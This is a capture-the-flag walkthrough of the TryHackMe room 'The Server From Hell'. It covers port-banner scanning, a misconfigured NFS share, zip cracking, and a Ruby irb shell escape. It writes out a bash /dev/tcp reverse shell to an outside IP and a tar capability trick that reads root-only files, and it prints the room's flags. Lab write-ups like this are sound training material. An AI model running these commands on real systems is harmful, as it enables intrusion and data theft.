# Tryhackme.com Room : The Server From Hell
`https://tryhackme.com/room/theserverfromhell`


# Instance
```
export IP=10.10.156.230
```

# Nmap
```

```

```

```

Shitload of ports available

The challenge says :
```
Start at port 1337 and enumerate your way.
Good luck.
```

so lets see what's on port 1337 `nc $IP 1337`
We get:
```
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports
```

The challenge says to start at `1337` so the first 100 ports should be between `1337` and `1437`

Trying some random ports `1356`:
```
HTTP/1.0 200 OK
Date: i
Server: Embedded HTTP Server.
d<meta http-equiv="refresh" content="0; URL=/scgi-bin/platform.cgi">
```

`1338`
```
+OK POP3 server ready
```

Gessing this is just there to fool nmap, big trolling here, that's why my nmap scan were taking forever..

We can just print the first 100 ports quickly with a small python script

```py
import subprocess
import argparse

parser = argparse.ArgumentParser('Experiment Runner')
parser.add_argument("--ip", type=str, default="10.10.156.230", help="Server ip")
parser.add_argument("--start_port", type=int, default=1, help="Start port")
parser.add_argument("--end_port", type=int, default=1337, help="End port")

args = parser.parse_args()

for port in range(args.start_port, args.end_port):
	print("="*40, flush=True)
	print(f"Port : {port}", flush=True)
	try:
		out = subprocess.check_output(f"nc {args.ip} {port}", shell=True, timeout=1.5)
	except subprocess.TimeoutExpired as e:
		print("------TIMEOUT EXPIRED------", flush=True)
		continue

	try:
		out = out.decode().strip()
	except:
		print("Couldn't decode... printing bytes", flush=True)
	print(out, flush=True)

print("Done...", flush=True)
```

Ok so.. this is big time trolling... every port is a different header for all sorts of program to fool nmap.

Couldn't find the trollface between `1337` and `1437`

I then scanned all the ports from `1` to `1337`.

Added some arguments to the python script so I could start multiple process and segment the port range between the processes. Much faster and simpler than implementing multiprocessing in python (Not worth it for this quick scanner)

Never found the troll face... upon looking back at the scan result, found this :
```
Port : 21
  28 550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf00
```

After connecting to this port we get 
```
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan
```

We can list the mount point with `showmount -e $IP`
```
Export list for 10.10.156.230:
/home/nfs *
```

We can mount this using `sudo mount -t nfs $IP:/home/nfs/ mnt`

We find a `backup.zip` file

This backup file contains an ssh key for the user `hades` but require a password

We run john using
```
zip2john backup.zip > zip.hash
jogn zip.hash
```

And we get the password
```
zxcvbnm
```

We find a `flag.txt` file
```
thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}
```

Here is the full listing of the files in `home/hades/.ssh`
```
authorized_keys
flag.txt
hint.txt
id_rsa
id_rsa.pub
```

Looking at `authorized_keys`, we see that this is the good key but im pretty sure that port `21` is not `ssh` since this is where we found the first clue.

The hint.txt file says 
```
2500-4500
```

So i guess the `ssh` port is in this range

modified the previous script to do an ssh scan
```py
out = subprocess.check_output(f"ssh -p {port} hades@{args.ip}", shell=True, timeout=1.5, stderr=subprocess.STDOUT)
```

Found the port on `3333` (Timeout expired)

We get this motd:
```
 ██░ ██ ▓█████  ██▓     ██▓
▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒
▒██▀▀██░▒███   ▒██░    ▒██░
░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░
░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░  ░░ ░   ░     ░ ░     ░ ░
 ░  ░  ░   ░  ░    ░  ░    ░  ░

 Welcome to hell. We hope you enjoy your stay!
 irb(main):001:0>
```

When typing `ls` we get 
```
 Traceback (most recent call last):
        2: from /usr/bin/irb:11:in <main>
        1: from (irb):1
NameError (undefined local variable or method 'ls' for main:Object)
```

Which mean that we are running in some kind of interpreter.
By googling the error message, quickly found out that it was a ruby shell.

We can run system commands using `system('cat user.txt')`
```
thm{sh3ll_3c4p3_15_v3ry_1337}
```
So now lets get a reverse shell


Tried this :
```
system("bash -i >& /dev/tcp/10.6.32.20/8888 0>&1")
```

But it fucked up the shell with a `bad file descriptor`

So i've simply written this line to a script and executed it
```
system("echo 'bash -i >& /dev/tcp/10.6.32.20/8888 0>&1' > /dev/shm/shell.sh")
system("chmod +x /dev/shm/shell.sh")
system("bash /dev/shm/shell.sh")
```

And i got a reverse shell.

After some time, I looked at the hint which says
```
getcap
```

So I `getcap -r / 2>/dev/null`
```
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar = cap_dac_read_search+ep
```

Using tar we can read the root flag file with
`tar xf "/root/root.txt" -I '/bin/sh -c "cat 1>&2"'`
```
thm{w0w_n1c3_3sc4l4t10n}
```

Not sure how I could escalate further with this tho. Only have read access.

Good enough to get the flag but not to get a root shell.

Tried to dump `/root/.ssh` but doesn't seem like there is something in there.

Oh well, upon reading writeups, I could have dumped `/etc/shadow` and cracked the root password to get a root shell.